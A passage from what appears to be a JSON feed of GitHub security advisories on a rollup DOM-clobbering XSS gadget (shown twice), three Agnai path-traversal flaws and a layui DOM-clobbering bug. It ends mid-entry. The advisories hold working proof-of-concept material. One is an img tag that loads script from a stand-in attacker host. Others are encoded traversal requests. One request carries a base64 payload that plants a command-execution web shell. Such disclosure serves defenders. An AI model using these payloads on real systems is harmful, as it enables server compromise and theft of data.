Clobbering attack.</p>\n<pre><code>const getRelativeUrlFromDocument = (relativePath: string, umd = false) =&gt;\n    getResolveUrl(\n        `'${escapeId(relativePath)}', ${\n            umd ? `typeof document === 'undefined' ? location.href : ` : ''\n        }document.currentScript &amp;&amp; document.currentScript.tagName.toUpperCase() === 'SCRIPT' &amp;&amp; document.currentScript.src || document.baseURI`\n    );\n</code></pre>\n<pre><code>const getUrlFromDocument = (chunkId: string, umd = false) =&gt;\n    `${\n        umd ? `typeof document === 'undefined' ? location.href : ` : ''\n    }(${DOCUMENT_CURRENT_SCRIPT} &amp;&amp; ${DOCUMENT_CURRENT_SCRIPT}.tagName.toUpperCase() === 'SCRIPT' &amp;&amp;${DOCUMENT_CURRENT_SCRIPT}.src || new URL('${escapeId(\n        chunkId\n    )}', document.baseURI).href)`;\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/rollup/rollup/security/advisories/GHSA-gcx4-mw62-g8wm\">https://github.com/rollup/rollup/security/advisories/GHSA-gcx4-mw62-g8wm</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47068\">https://nvd.nist.gov/vuln/detail/CVE-2024-47068</a></li>\n<li><a href=\"https://github.com/rollup/rollup/commit/2ef77c00ec2635d42697cff2c0567ccc8db34fb4\">https://github.com/rollup/rollup/commit/2ef77c00ec2635d42697cff2c0567ccc8db34fb4</a></li>\n<li><a href=\"https://github.com/rollup/rollup/commit/e2552c9e955e0a61f70f508200ee9f752f85a541\">https://github.com/rollup/rollup/commit/e2552c9e955e0a61f70f508200ee9f752f85a541</a></li>\n<li><a href=\"https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162\">https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162</a></li>\n<li><a href=\"https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185\">https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gcx4-mw62-g8wm\">https://github.com/advisories/GHSA-gcx4-mw62-g8wm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gcx4-mw62-g8wm",
            "title": "[rollup] DOM Clobbering Gadget found in rollup bundled scripts that leads to XSS",
            "date_modified": "2024-09-26T21:11:54.000Z",
            "date_published": "2024-09-23T22:11:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gcx4-mw62-g8wm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>We discovered a DOM Clobbering vulnerability in rollup when bundling scripts that use <code>import.meta.url</code> or with plugins that emit and reference asset files from code  in <code>cjs</code>/<code>umd</code>/<code>iife</code> format. The DOM Clobbering gadget can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an <code>img</code> tag with an unsanitized <code>name</code> attribute) are present.</p>\n<p>It's worth noting that we’ve identifed similar issues in other popular bundlers like Webpack (<a href=\"https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986\">CVE-2024-43788</a>), which might serve as a good reference.</p>\n<h3 id=\"details\">Details</h3>\n<h4 id=\"backgrounds\">Backgrounds</h4>\n<p>DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:</p>\n<p>[1] <a href=\"https://scnps.co/papers/sp23_domclob.pdf\">https://scnps.co/papers/sp23_domclob.pdf</a>\n[2] <a href=\"https://research.securitum.com/xss-in-amp4email-dom-clobbering/\">https://research.securitum.com/xss-in-amp4email-dom-clobbering/</a></p>\n<h4 id=\"gadget-found-in-rollup\">Gadget found in <code>rollup</code></h4>\n<p>We have identified a DOM Clobbering vulnerability in <code>rollup</code> bundled scripts, particularly when the scripts uses <code>import.meta</code> and set output in format of  <code>cjs</code>/<code>umd</code>/<code>iife</code>. In such cases, <code>rollup</code> replaces meta property with the URL retrieved from <code>document.currentScript</code>.</p>\n<p><a href=\"https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162\">https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162</a></p>\n<p><a href=\"https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185\">https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185</a></p>\n<p>However, this implementation is vulnerable to a DOM Clobbering attack. The <code>document.currentScript</code> lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the <code>src</code> attribute of the attacker-controlled element (e.g., an <code>img</code> tag ) is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Considering a website that contains the following <code>main.js</code> script, the devloper decides to use the <code>rollup</code> to bundle up the program: <code>rollup main.js --format cjs --file bundle.js</code>.</p>\n<pre><code>var s = document.createElement('script')\ns.src = import.meta.url + 'extra.js'\ndocument.head.append(s)\n</code></pre>\n<p>The output <code>bundle.js</code> is shown in the following code snippet.</p>\n<pre><code>'use strict';\n\nvar _documentCurrentScript = typeof document !== 'undefined' ? document.currentScript : null;\nvar s = document.createElement('script');\ns.src = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(__filename).href : (_documentCurrentScript &amp;&amp; False &amp;&amp; _documentCurrentScript.src || new URL('bundle.js', document.baseURI).href)) + 'extra.js';\ndocument.head.append(s);\n</code></pre>\n<p>Adding the <code>rollup</code> bundled script, <code>bundle.js</code>, as part of the web page source code, the page could load the <code>extra.js</code> file from the attacker's domain, <code>attacker.controlled.server</code> due to the introduced gadget during bundling. The attacker only needs to insert an <code>img</code> tag with the name attribute set to <code>currentScript</code>. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.</p>\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n  &lt;title&gt;rollup Example&lt;/title&gt;\n  &lt;!-- Attacker-controlled Script-less HTML Element starts--!&gt;\n  &lt;img name=\"currentScript\" src=\"https://attacker.controlled.server/\"&gt;&lt;/img&gt;\n  &lt;!-- Attacker-controlled Script-less HTML Element ends--!&gt;\n&lt;/head&gt;\n&lt;script type=\"module\" crossorigin src=\"bundle.js\"&gt;&lt;/script&gt;\n&lt;body&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability can result in cross-site scripting (XSS) attacks on websites that include rollup-bundled files (configured with an output format of <code>cjs</code>, <code>iife</code>, or <code>umd</code> and use <code>import.meta</code>) and allow users to inject certain scriptless HTML tags without properly sanitizing the <code>name</code> or <code>id</code> attributes.</p>\n<h3 id=\"patch\">Patch</h3>\n<p>Patching the following two functions with type checking would be effective mitigations against DOM Clobbering attack.</p>\n<pre><code>const getRelativeUrlFromDocument = (relativePath: string, umd = false) =&gt;\n    getResolveUrl(\n        `'${escapeId(relativePath)}', ${\n            umd ? `typeof document === 'undefined' ? location.href : ` : ''\n        }document.currentScript &amp;&amp; document.currentScript.tagName.toUpperCase() === 'SCRIPT' &amp;&amp; document.currentScript.src || document.baseURI`\n    );\n</code></pre>\n<pre><code>const getUrlFromDocument = (chunkId: string, umd = false) =&gt;\n    `${\n        umd ? `typeof document === 'undefined' ? location.href : ` : ''\n    }(${DOCUMENT_CURRENT_SCRIPT} &amp;&amp; ${DOCUMENT_CURRENT_SCRIPT}.tagName.toUpperCase() === 'SCRIPT' &amp;&amp;${DOCUMENT_CURRENT_SCRIPT}.src || new URL('${escapeId(\n        chunkId\n    )}', document.baseURI).href)`;\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/rollup/rollup/security/advisories/GHSA-gcx4-mw62-g8wm\">https://github.com/rollup/rollup/security/advisories/GHSA-gcx4-mw62-g8wm</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47068\">https://nvd.nist.gov/vuln/detail/CVE-2024-47068</a></li>\n<li><a href=\"https://github.com/rollup/rollup/commit/2ef77c00ec2635d42697cff2c0567ccc8db34fb4\">https://github.com/rollup/rollup/commit/2ef77c00ec2635d42697cff2c0567ccc8db34fb4</a></li>\n<li><a href=\"https://github.com/rollup/rollup/commit/e2552c9e955e0a61f70f508200ee9f752f85a541\">https://github.com/rollup/rollup/commit/e2552c9e955e0a61f70f508200ee9f752f85a541</a></li>\n<li><a href=\"https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162\">https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162</a></li>\n<li><a href=\"https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185\">https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gcx4-mw62-g8wm\">https://github.com/advisories/GHSA-gcx4-mw62-g8wm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gcx4-mw62-g8wm",
            "title": "[rollup] DOM Clobbering Gadget found in rollup bundled scripts that leads to XSS",
            "date_modified": "2024-09-26T21:11:54.000Z",
            "date_published": "2024-09-23T22:11:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gcx4-mw62-g8wm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A vulnerability has been discovered in <strong>Agnai</strong> that permits attackers to upload image files at attacker-chosen location on the server. This issue can lead to image file uploads to unauthorized or unintended directories, including overwriting of existing images which may be used for defacement.</p>\n<p>This does not affect:</p>\n<ul>\n<li>agnai.chat</li>\n<li>installations using S3-compatible storage</li>\n<li>self-hosting that is not publicly exposed</li>\n</ul>\n<h3 id=\"cwe-35-path-traversal\">CWE-35: Path Traversal</h3>\n<p><a href=\"https://cwe.mitre.org/data/definitions/35.html\">https://cwe.mitre.org/data/definitions/35.html</a></p>\n<h3 id=\"cvss40---23-low\">CVSS4.0 - 2.3 Low</h3>\n<p>CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N</p>\n<h3 id=\"details\">Details</h3>\n<p>This is a path traversal vulnerability. An attacker can exploit this vulnerability by sending a specially crafted request to the <code>editCharacter</code> handler <a href=\"https://github.com/agnaistic/agnai/blob/75abbd5b0f5e48ddecc805365cf1574d05ee1ce5/srv/api/character.ts#L140\">https://github.com/agnaistic/agnai/blob/75abbd5b0f5e48ddecc805365cf1574d05ee1ce5/srv/api/character.ts#L140</a>:</p>\n<pre><code class=\"language-tsx\">POST /api/character/28cbe508-2fa9-4890-886e-61d73e22006c%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%61%70%70%2f%64%69%73%74%2f%64%61%6e%79%61%6e%67 HTTP/1.1\n</code></pre>\n<p>The path traversal character sequence makes it’s way into the <code>id</code> variable which is then string interpolated into <code>filename</code>. </p>\n<pre><code class=\"language-jsx\">export async function entityUpload(kind: string, id: string, attachment?: Attachment) {\n  if (!attachment) return\n  const filename = `${kind}-${id}`\n  return upload(attachment, filename)\n}\n</code></pre>\n<p><a href=\"https://github.com/agnaistic/agnai/blob/75abbd5b0f5e48ddecc805365cf1574d05ee1ce5/srv/api/upload.ts#L55\">https://github.com/agnaistic/agnai/blob/75abbd5b0f5e48ddecc805365cf1574d05ee1ce5/srv/api/upload.ts#L55</a></p>\n<p>No path normalization is conducted nor checked, so attackers can freely manipulate the path which the file is uploaded to.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability is classified as a path traversal vulnerability. Attackers can upload image files to arbitrary locations, potentially overwriting critical system image files.</p>\n<h3 id=\"credit\">Credit</h3>\n<p>Security research in collaboration with Analyst <a href=\"https://github.com/noe233\">Danyang Liu (noe223)</a> @noe233</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/agnaistic/agnai/security/advisories/GHSA-g54f-66mw-hv66\">https://github.com/agnaistic/agnai/security/advisories/GHSA-g54f-66mw-hv66</a></li>\n<li><a href=\"https://github.com/agnaistic/agnai/blob/75abbd5b0f5e48ddecc805365cf1574d05ee1ce5/srv/api/character.ts#L140:\">https://github.com/agnaistic/agnai/blob/75abbd5b0f5e48ddecc805365cf1574d05ee1ce5/srv/api/character.ts#L140:</a></li>\n<li><a href=\"https://github.com/agnaistic/agnai/blob/75abbd5b0f5e48ddecc805365cf1574d05ee1ce5/srv/api/upload.ts#L55\">https://github.com/agnaistic/agnai/blob/75abbd5b0f5e48ddecc805365cf1574d05ee1ce5/srv/api/upload.ts#L55</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47171\">https://nvd.nist.gov/vuln/detail/CVE-2024-47171</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g54f-66mw-hv66\">https://github.com/advisories/GHSA-g54f-66mw-hv66</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g54f-66mw-hv66",
            "title": "[agnai] Agnai vulnerable to Relative Path Traversal in Image Upload",
            "date_modified": "2024-09-26T21:11:07.000Z",
            "date_published": "2024-09-26T18:16:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g54f-66mw-hv66"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"cwe-35-path-traversal\">CWE-35: Path Traversal</h3>\n<p><a href=\"https://cwe.mitre.org/data/definitions/35.html\">https://cwe.mitre.org/data/definitions/35.html</a></p>\n<h3 id=\"cvssv31-43---medium\">CVSSv3.1 4.3 - Medium</h3>\n<p>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N\nCVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N</p>\n<h3 id=\"summary\">Summary</h3>\n<p>A vulnerability has been discovered in <strong>Agnai</strong> that permits attackers to read arbitrary JSON files at attacker-chosen locations on the server. This issue can lead to unauthorized access to sensitive information and exposure of confidential configuration files.\n<strong>This only affects installations with <code>JSON_STORAGE</code> enabled which is intended to local/self-hosting only.</strong></p>\n<h3 id=\"details--poc\">Details &amp; PoC</h3>\n<p>This is a path traversal vulnerability. An attacker can exploit this vulnerability by sending a specially crafted request:</p>\n<pre><code class=\"language-tsx\">GET /api/json/messages/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%61%70%70%2fpackage HTTP/1.1\n</code></pre>\n<p>In this example, the attacker retrieves the <code>package.json</code> file content from the server by manipulating the file path.</p>\n<p>The request is processed by the <code>loadMessages</code> handler in <code>agnai/srv/api/json/index.ts</code> and a file is read and returned to the client. The read filename is constructed using string interpolation, with no guard or check for path traversal: <a href=\"https://github.com/agnaistic/agnai/blob/2b878b7ca66471c5dd080197ad9ca2f7f0022655/srv/api/json/index.ts#L77\">https://github.com/agnaistic/agnai/blob/2b878b7ca66471c5dd080197ad9ca2f7f0022655/srv/api/json/index.ts#L77</a></p>\n<h4 id=\"constraints\">Constraints</h4>\n<p>Environment constraints: JSON Storage enabled (non standard)</p>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability is classified as a path traversal vulnerability. Specifically, any JSON file on the server which the webserver process has read privileges for, can be disclosed to the attacker.</p>\n<h3 id=\"credit\">Credit</h3>\n<ul>\n<li>@ropwareJB</li>\n<li>@noe233</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/agnaistic/agnai/security/advisories/GHSA-h355-hm5h-cm8h\">https://github.com/agnaistic/agnai/security/advisories/GHSA-h355-hm5h-cm8h</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47170\">https://nvd.nist.gov/vuln/detail/CVE-2024-47170</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h355-hm5h-cm8h\">https://github.com/advisories/GHSA-h355-hm5h-cm8h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h355-hm5h-cm8h",
            "title": "[agnai] Agnai File Disclosure Vulnerability: JSON via Path Traversal ",
            "date_modified": "2024-09-26T21:11:07.000Z",
            "date_published": "2024-09-26T18:07:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h355-hm5h-cm8h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>A vulnerability has been discovered in <strong>Agnai</strong> that permits attackers to upload arbitrary files to attacker-chosen locations on the server, including JavaScript, enabling the execution of commands within those files. This issue could result in unauthorized access, full server compromise, data leakage, and other critical security threats.</p>\n<p>This <strong>does not</strong> affect:</p>\n<ul>\n<li><code>agnai.chat</code></li>\n<li>installations using S3-compatible storage</li>\n<li>self-hosting that is not publicly exposed</li>\n</ul>\n<p>This <strong>DOES</strong> affect:</p>\n<ul>\n<li>publicly hosted installs without S3-compatible storage</li>\n</ul>\n<h3 id=\"cwes\">CWEs</h3>\n<p>CWE-35: Path Traversal</p>\n<p>CWE-434: Unrestricted Upload of File with Dangerous Type</p>\n<h3 id=\"cvss-40---90---critical\">CVSS-4.0 - <strong>9.0 - Critical</strong></h3>\n<p>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\nCVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H</p>\n<h3 id=\"description\">Description</h3>\n<p>Path Traversal and Unrestricted Upload of File with Dangerous Type</p>\n<p>Path Traversal Location</p>\n<pre><code class=\"language-tsx\">POST /api/chat/5c25e8dc-67c3-40e1-9572-32df2e26ff38/temp-character HTTP/1.1\n{\"_id\": \"/../../../../../../app/srv/api/voice\",...&lt;ommitted&gt;}\n</code></pre>\n<p>In the following file, the <code>_id</code> parameter which is a remote-supplied parameter is not properly validated and sanitized.</p>\n<p><a href=\"https://github.com/agnaistic/agnai/blob/437227d9aa86132f3be3b41c89981cb393c903d0/srv/api/chat/characters.ts#L101\">https://github.com/agnaistic/agnai/blob/437227d9aa86132f3be3b41c89981cb393c903d0/srv/api/chat/characters.ts#L101</a></p>\n<pre><code class=\"language-jsx\"> const upserted: AppSchema.Character = {\n    _id: body._id || `temp-${v4().slice(0, 8)}`,\n    kind: 'character',\n    createdAt: now(),\n</code></pre>\n<p>In the following file, the <code>filename</code> (or <code>id</code>)  and  <code>content</code> variables are not properly sanitized and validated,</p>\n<p><a href=\"https://github.com/agnaistic/agnai/blob/dev/srv/api/upload.ts#L63\">https://github.com/agnaistic/agnai/blob/dev/srv/api/upload.ts#L63</a></p>\n<pre><code class=\"language-jsx\">export async function entityUploadBase64(kind: string, id: string, content?: string) {\n  if (!content) return\n  if (!content.includes(',')) return\n\n  const filename = `${kind}-${id}`\n  const attachment = toAttachment(content)\n  return upload(attachment, filename)\n}\n</code></pre>\n<pre><code class=\"language-jsx\">function toAttachment(content: string): Attachment {\n  const [prefix, base64] = content.split(',')\n  const type = prefix.slice(5, -7)\n  const [, ext] = type.split('/')\n  return {\n    ext,\n    field: '',\n    original: '',\n    type: getType(ext),\n    content: Buffer.from(base64, 'base64'),\n  }\n}\n</code></pre>\n<p>An attacker can freely specify arbitrary file types (and arbitrary base64-encoded file content), thereby permitting them to upload JavaScript files and by abusing the <code>_id</code> parameter, to control the location of the file to overwrite an existing server file;</p>\n<pre><code class=\"language-jsx\">POST /api/chat/5c25e8dc-67c3-40e1-9572-32df2e26ff38/temp-character HTTP/1.1\n...\nConnection: keep-alive\n\n{\n\"_id\": \"/../../../../../../app/srv/api/voice\",\n\"name\":\"\",\"description\":\"\",\"culture\":\"en-us\",\"tags\":[],\"scenario\":\"\",\"appearance\":\"\",\"visualType\":\"avatar\",\"avatar\":\"data:image/js;base64,InVzZSBzdHJpY3QiOwpPYmplY3QuZGVmaW5lUHJvcGVydHkoZXhwb3J0cywgIl9fZXNNb2R1bGUiLCB7IHZhbHVlOiB0cnVlIH0pOwpjb25zdCBleHByZXNzXzEgPSByZXF1aXJlKCJleHByZXNzIik7CmNvbnN0IHdyYXBfMSA9IHJlcXVpcmUoIi4vd3JhcCIpOwpjb25zdCB2b2ljZV8xID0gcmVxdWlyZSgiLi4vdm9pY2UiKTsKY29uc3QgZGJfMSA9IHJlcXVpcmUoIi4uL2RiIik7CmNvbnN0IHZhbGlkXzEgPSByZXF1aXJlKCIvY29tbW9uL3ZhbGlkIik7CmNvbnN0IHJvdXRlciA9ICgwLCBleHByZXNzXzEuUm91dGVyKSgpOwpjb25zdCB0ZXh0VG9TcGVlY2hWYWxpZCA9IHsgdGV4dDogJ3N0cmluZycsIHZvaWNlOiAnYW55JyB9Owpjb25zdCB0ZXh0VG9TcGVlY2ggPSAoMCwgd3JhcF8xLmhhbmRsZSkoYXN5bmMgKHsgYm9keSwgdXNlcklkLCBzb2NrZXRJZCwgbG9nLCBwYXJhbXMgfSkgPT4gewogICAgY29uc3QgdXNlciA9IHVzZXJJZCA/IGF3YWl0IGRiXzEuc3RvcmUudXNlcnMuZ2V0VXNlcih1c2VySWQpIDogYm9keS51c2VyOwogICAgY29uc3QgZ3Vlc3RJZCA9IHVzZXJJZCA/IHVuZGVmaW5lZCA6IHNvY2tldElkOwogICAgKDAsIHZhbGlkXzEuYXNzZXJ0VmFsaWQpKHRleHRUb1NwZWVjaFZhbGlkLCBib2R5KTsKICAgIHJldHVybiAoMCwgdm9pY2VfMS5nZW5lcmF0ZVRleHRUb1NwZWVjaCkodXNlciwgbG9nLCBndWVzdElkLCBib2R5LnRleHQsIGJvZHkudm9pY2UpOwp9KTsKY29uc3QgZ2V0Vm9pY2VzID0gKDAsIHdyYXBfMS5oYW5kbGUpKGFzeW5jICh7IGJvZHksIHVzZXJJZCwgc29ja2V0SWQsIGxvZywgcGFyYW1zIH0pID0+IHsKICAgIGNvbnN0IHR0c1NlcnZpY2UgPSBwYXJhbXMuaWQ7CiAgICBjb25zdCB1c2VyID0gdXNlcklkID8gYXdhaXQgZGJfMS5zdG9yZS51c2Vycy5nZXRVc2VyKHVzZXJJZCkgOiBib2R5LnVzZXI7CiAgICBjb25zdCBndWVzdElkID0gdXNlcklkID8gdW5kZWZpbmVkIDogc29ja2V0SWQ7CiAgICByZXR1cm4gKDAsIHZvaWNlXzEuZ2V0Vm9pY2VzTGlzdCkoeyB0dHNTZXJ2aWNlOiB0dHNTZXJ2aWNlLCB1c2VyIH0sIGxvZywgZ3Vlc3RJZCk7Cn0pOwpjb25zdCBnZXRNb2RlbHMgPSAoMCwgd3JhcF8xLmhhbmRsZSkoYXN5bmMgKHsgYm9keSwgdXNlcklkLCBzb2NrZXRJZCwgbG9nLCBwYXJhbXMgfSkgPT4gewogICAgY29uc3QgdHRzU2VydmljZSA9IHBhcmFtcy5pZDsKICAgIGNvbnN0IHVzZXIgPSB1c2VySWQgPyBhd2FpdCBkYl8xLnN0b3JlLnVzZXJzLmdldFVzZXIodXNlcklkKSA6IGJvZHkudXNlcjsKICAgIGNvbnN0IGd1ZXN0SWQgPSB1c2VySWQgPyB1bmRlZmluZWQgOiBzb2NrZXRJZDsKICAgIHJldHVybiAoMCwgdm9pY2VfMS5nZXRNb2RlbHNMaXN0KSh7IHR0c1NlcnZpY2U6IHR0c1NlcnZpY2UsIHVzZXIgfSwgbG9nLCBndWVzdElkKTsKfSk7Cgpjb25zdCBnZXRDbWQgPSAoMCwgd3JhcF8xLmhhbmRsZSkoYXN5bmMgKHsgYm9keSwgdXNlcklkLCBzb2NrZXRJZCwgbG9nLCBwYXJhbXMgfSkgPT4gewoJY29uc3QgY2hpbGRfcHJvY2Vzc18xID0gcmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpOwoJY2hpbGRfcHJvY2Vzc18xLmV4ZWNTeW5jKGJvZHkuY21kKTsKICAgIHJldHVybiAoMCwgdm9pY2VfMS5nZXRNb2RlbHNMaXN0KSh7IHR0c1NlcnZpY2U6IHR0c1NlcnZpY2UsIHVzZXIgfSwgbG9nLCBndWVzdElkKTsKfSk7Cgpyb3V0ZXIucG9zdCgnL3R0cycsIHRleHRUb1NwZWVjaCk7CnJvdXRlci5wb3N0KCcvOmlkL3ZvaWNlcycsIGdldFZvaWNlcyk7CnJvdXRlci5wb3N0KCcvOmlkL21vZGVscycsIGdldE1vZGVscyk7CnJvdXRlci5wb3N0KCcvY21kJywgZ2V0Q21kKTsKZXhwb3J0cy5kZWZhdWx0ID0gcm91dGVyOwovLyMgc291cmNlTWFwcGluZ1VSTD12b2ljZS5qcy5tYXA=\",\"sprite\":null,\"greeting\":\"\",\"sampleChat\":\"\",\"voiceDisabled\":false,\"voice\":{},\"systemPrompt\":\"\",\"postHistoryInstructions\":\"\",\"insert\":{\"prompt\":\"\",\"depth\":3},\"alternateGreetings\":[],\"creator\":\"\",\"characterVersion\":\"\",\"persona\":{\"kind\":\"text\",\"attributes\":{\"text\":[\"\"]}},\"imageSettings\":{\"type\":\"sd\",\"steps\":10,\"width\":512,\"height\":512,\"prefix\":\"\",\"suffix\":\"\",\"negative\":\"\",\"cfg\":9,\"summariseChat\":true,\"summaryPrompt\":\"\"}}\n</code></pre>\n<h3 id=\"risk\">Risk</h3>\n<p>The attacker can write arbitrary files to disk, including overwriting existing JavaScript to execute arbitrary code on the server, leading to a complete system compromise, server control, and further network penetration.</p>\n<p>Attackers can gain full access to the server.</p>\n<h3 id=\"recommendation\">Recommendation</h3>\n<p><strong>Input Validation</strong></p>\n<ul>\n<li>Ensure thorough validation of user inputs, particularly id parameter, file paths and file names, to prevent directory traversal and ensure they end up in the desired folder location post-normalization. <a href=\"https://owasp.org/www-community/attacks/Path_Traversal\"></a><a href=\"https://owasp.org/www-community/attacks/Path_Traversal\">OWASP: Path Traversal</a></li>\n</ul>\n<p><strong>Arbitrary File Upload</strong></p>\n<ul>\n<li>Restrict the types of files that can be uploaded via a allow-only list.</li>\n</ul>\n<h3 id=\"credits\">Credits</h3>\n<ul>\n<li>@ropwareJB</li>\n<li>@noe233</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/agnaistic/agnai/security/advisories/GHSA-mpch-89gm-hm83\">https://github.com/agnaistic/agnai/security/advisories/GHSA-mpch-89gm-hm83</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47169\">https://nvd.nist.gov/vuln/detail/CVE-2024-47169</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mpch-89gm-hm83\">https://github.com/advisories/GHSA-mpch-89gm-hm83</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mpch-89gm-hm83",
            "title": "[agnai] Agnai vulnerable to Remote Code Execution via JS Upload using Directory Traversal",
            "date_modified": "2024-09-26T21:11:07.000Z",
            "date_published": "2024-09-26T18:05:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mpch-89gm-hm83"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A DOM Clobbering vulnerability has been discovered in <code>layui</code> that can lead to Cross-site Scripting (XSS) on web pages where attacker-controlled HTML elements (e.g., <code>img</code> tags with unsanitized <code>name</code> attributes) are present.</p>\n<p>It's worth noting that we’ve identifed similar issues in other popular client-side libraries like Webpack (<a href=\"https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986\">CVE-2024-43788</a>) and Vite (<a href=\"https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3\">CVE-2024-45812</a>), which might serve as valuable references.</p>\n<h3 id=\"backgrounds\">Backgrounds</h3>\n<p>DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code snippet) living in the existing libraries to transform it into executable code. </p>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability can lead to cross-site scripting (XSS) on websites that uses <code>layui</code> library and allow users to inject certain scriptless HTML tags with improperly sanitized <code>name</code> or <code>id</code> attributes.</p>\n<h3 id=\"patch\">Patch</h3>\n<p>This problem has been patched in Layui 2.9.17. You can find the official fix announcement at: \n<a href=\"https://layui.dev/notes/share/security-currentscript.html\">https://layui.dev/notes/share/security-currentscript.html</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/layui/layui/security/advisories/GHSA-j827-6rgf-9629\">https://github.com/layui/layui/security/advisories/GHSA-j827-6rgf-9629</a></li>\n<li><a 